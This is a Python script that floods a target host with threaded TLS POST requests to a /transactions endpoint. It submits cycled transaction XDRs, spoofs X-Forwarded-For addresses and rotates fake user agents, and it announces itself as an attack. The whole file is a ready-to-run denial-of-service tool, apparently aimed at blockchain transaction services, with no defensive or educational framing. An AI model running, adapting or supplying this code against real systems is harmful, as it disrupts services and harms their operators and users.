# -*- coding: utf-8 -*-

import random
import socket
import sys
import ssl
import threading
import time
from fake_useragent import UserAgent
import ipaddress
import itertools
import json

sys.path.append('/root/flooding/flood_env/lib/python3.11/site-packages')

ua = UserAgent()
ip_pool = [str(ip) for ip in ipaddress.IPv4Network('192.168.0.0/16')]

# Hardcoded transaction XDR (replace with valid one)
FAKE_XDR = "AAAAAgAAAACR73hGsTk1FGYijC2RcvcPjf7uew1sCURE6xdkYRLQvgAEk+AA0NsuAAABAwAAAAEAAAAAAAAAAAAAAABoKmjcAAAAAAAAAAMAAAAAAAAAAQAAAAB/GrcsnAKGwNX6BNrfRPDjUZjcB44JStbtOA0tWoa6VgAAAAAAAAAAAJiWgAAAAAEAAAAAfxq3LJwChsDV+gTa30Tw41GY3AeOCUrW7TgNLVqGulYAAAAPAAAAAJit5JjGzCrIYOHLjR1xhyZdMep04JYFNnzP1jYEsQQAAAAAAQAAAAB/GrcsnAKGwNX6BNrfRPDjUZjcB44JStbtOA0tWoa6VgAAAAEAAAAAke94RrE5NRRmIowtkXL3D43+7nsNbAlEROsXZGES0L4AAAAAAAAAAACYloAAAAAAAAAAAlqGulYAAABALxIBNIN4T4eYgvEbJVC+/rVMk1tnaFw5eL4Z9wM3jZpmEHk3NGqXiwmXBjWkaYQ0hm3vu2Nm1SIhIlKgvTOnB2ES0L4AAABAEtHka3t2yLwz/Cbw6JkONRbcuBFiRPDjdamtuwgmfW7bkBPMJBm5EV7tce58HMm8+KZHN1ydf2NrxZ7SM9gRAg=="
# Global flag for response display
response_printed = False

# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print(f"ERROR\n Usage: {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
    sys.exit(1)

# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print(" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Shared variables
thread_num = 0
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()


with open("xdr_batch.json") as f:
    xdr_data = json.load(f)
    xdr_pool = itertools.cycle(xdr_data['xdrs'])


def attack():
    global response_printed
    print_status()
    current_xdr = next(xdr_pool)
    data = f"tx={current_xdr}"
    
    headers = [
        f"X-Forwarded-For: {random.choice(ip_pool)}",
        f"User-Agent: {ua.random}",
        "Accept-Language: en-US,en;q=0.9",
        "Connection: keep-alive",
        "Content-Type: application/x-www-form-urlencoded",
        f"Content-Length: {len(data)}"
    ]

    #dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
            # Create SSL context
            context = ssl.create_default_context()
            with socket.create_connection((ip, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    request = (
                            f"POST /transactions HTTP/1.1\r\n" +
                            f"Host: {host}\r\n" +
                            "\r\n".join(headers) +
                            "\r\n\r\n" +
                            data
                    ).encode()

                    ssock.sendall(request)

                    # Receive response
                    #response = b''
                    #while True:
                    #    chunk = ssock.recv(4096)
                    #    if not chunk:
                    #        break
                    #    response += chunk
                    #if response:
                    #        status_line = response.split(b'\r\n')[0].decode()
                    #        headers_end = response.find(b'\r\n\r\n')
                    #        print("\n\n[First Server Response]")
                    #        print(f"Status Code: {status_line}")
                    #        if headers_end != -1:
                    #            print("Headers:\n" + response[:headers_end].decode())
                    #            print("Body:\n" + response[headers_end+4:].decode())
                    #        else:
                    #            print("Full Response:\n" + response.decode())
                    #        #response_printed = True

    except Exception as e:
            if not response_printed:
                print(f"\n[Error]: {str(e)}")

print(f"[#] Attack started on {host} ({ip}) || Port: {port} || # Requests: {num_requests}")

# Thread management
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)
    time.sleep(0.0001)

for current_thread in all_threads:
    current_thread.join()
